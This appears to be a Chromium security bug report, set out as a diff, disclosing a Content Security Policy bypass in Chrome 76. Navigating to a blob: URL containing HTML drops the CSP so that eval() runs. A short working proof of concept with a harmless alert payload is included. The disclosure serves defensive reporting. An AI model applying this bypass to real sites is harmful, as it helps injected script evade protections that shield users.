@@ -1,0 +1,26 @@
+VULNERABILITY DETAILS
+When setting a CSP that allows blob: URIs, creating a blob: of type "text/html" and then navigating to that blob removes the CSP restrictions with script-src 'unsafe-inline'. That means an eval() call can been executed.Just like https://crbug.com/chromium/905301.
+VERSION
+Chrome Version: [76.0.3809.87] + [stable]
+Operating System: [Windows10 1903]
+REPRODUCTION CASE
+When navigating to the blob, the eval() function in the blob gets executed.
+This security feature is worked in Firefox/MicrosoftEdge(Dev).
+POC:
+<head>  
+    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' ">  
+</head>  
+  
+<body>  
+    <script>  
+        let blob = new Blob([`  
+        <script>      
+        eval('alert(location.href)');  
+        <\/script>  
+    `], {  
+            type: "text/html"  
+        });  
+        let url = URL.createObjectURL(blob);  
+        location.href = url  
+    </script>  
+</body>  
